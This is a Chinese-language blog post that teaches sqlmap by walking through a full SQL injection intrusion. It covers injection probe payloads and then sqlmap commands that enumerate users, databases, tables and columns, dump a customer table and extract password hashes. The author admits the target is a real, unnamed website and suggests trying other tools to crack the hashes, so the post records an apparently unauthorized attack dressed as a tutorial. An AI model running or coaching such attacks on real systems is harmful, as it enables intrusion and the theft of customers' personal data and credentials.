---
title: sqlmap-基于sql注入的数据猜解
date: 2016-03-17 10:47:52
tags: [sqlmap,黑客]
categories: twist.zheng
---

### 引言
[sqlmap](https://github.com/sqlmapproject/sqlmap)是一款基于python语言的自动化检测web项目是否有sql注入的测试工具，不过这也是很多黑客的必备工具之一，今天我们就用sqlmap，向大家演示一次完整的数据库入侵过程。

### 关于sql注入
sql注入只要是写过web项目的人应该都听说过，sql注入是如何产生的呢？我们来举个例子，比如我们写一个sql语句："select * from users where username= xiaoming" 看似这个sql语句没有什么错误，无可厚非，xiaoming是我们要传入的参数，一般由用户输入，不过如果用户输入的是 xiaoming or 1=1 会怎么样呢？

显而易见，现在我们的sql语句就变成了"select * from users where username = xiaoming or 1=1"，由于1=1是恒成立的，这样一来我们岂不是把数据库里面所有的用户都查出来了，这简直是一个巨大的灾难。（一般如果sql语句是通过手动拼凑的话极大可能存在sql注入漏洞）

那么如何来检查一个接口是否存在sql漏洞呢，一般我们检查一个接口是否存在sql注入，会通过在接口url参数后面通过拼凑多余判断来查看是否存在sql注入，比如：?username = xiaoming and 1=1 或者？username=xiaoming' and '1=1 等，如果页面显示正常，则一般不存在sql注入，如果页面崩溃报错或者显示异常则存在sql注入。

### 一次sqlmap猜解过程
这里，我们演示一次具体的使用sqlmap数据猜解的过程。

##### sqlmap -u
`sqlmap -u +url`命令，url即你怀疑可能存在sql注入的接口。
```bash
  sqlmap -u http://*.*.*.*/intro.php?cid=57
```
结果如下：
![img](/images/sqlmap-u.jpg)
这样我们就知道了服务器配置：windows服务器，mysql5.0 apache2.2 php5.3

##### sqlmap -u http://****  --users
`--users` 命令列举出数据库中存在的用户：
结果如下:
![img](/images/sqlmap-users.jpg)
可以看到数据库存在两个用户，一个是root用户，一个是chihumis。
其中`localhost`和`127.0.0.1`表示本机权限，`%`表示具有远程权限（设想一下，我们如果拿到了远程权限的数据库密码会怎么样，我们能不能拿到呢？别急，我们接着往下看）

##### sqlmap -u http://****　--dbs
`--dbs` 列举出数据库中的database.
![img](/images/sqlmap-dbs.jpg)
数据库中database还不少，有62个.

##### sqlmap -u http://**** -D　database --tables
`--tables` 列举出数据库里面的表. `-D`指定某个数据库，如果不指定，将列出所有数据库的表
我们查看一下chihumis(我不知道这个单词是什么意思，但我猜既然能作为用户名的话，也许有特殊含义)这个数据库的表有哪些
```bash
   sqlmap -u http://*** -D chihumis --tables

![img](/images/sqlmap-tables.jpg)
结果已经出来了，这个数据库总共有80张表

##### sqlmap -u http://****  -D database -T table --columns
`--columns` 列举出某张表的数据结构。
我们来试一试第一张表吧
```bash
   sqlmap -u http://*** -D chihumis -T ch_b_customer --columns
```
结果如下
![img](/images/sqlmap-columns.jpg)

##### sqlmap -u http://**** -D database -T table --dump
`--dump` 打印出某张表的数据结构，这个太可怕了。
```bash
   sqlmap -u http://*** -D chihumis -T ch_b_customer --dump
```
表中的数据如图：
![img](/images/sqlmap-dump.jpg)
不好意思，因为是未知名站点的真实数据，这里只好打上码了，相信你们对打码这种事情并不陌生，所以不会介意的^o^
(这期间因为sqlmap检测到加密了的字段，在执行的过程中询问我要不要进行破解！！！)

##### sqlmap -u http://**** --passwords
`--passwords`命令会列出数据可以用户，并列出密码的hash，且尝试破解。
刚刚我们提到，我们是否可以拿到数据库用户的密码呢，`--passwords`命令就是为了这个需求的
```bash
   sqlmap -u http://*** --passwords
```
用户名和用户密码的hash值如下：
![img](/images/sqlmap-password.jpg)
我个人觉得用sqlmap自带的密码破解字典的话，破解概率不是那么高，现在的破解工具那么多，你可以试一试别的方法。

### 最后
最后千万不要拿着sqlmap去做坏事哦，毕竟我们是一个有道德的hacker(原谅我用一个真实的站点来写这篇博客)。
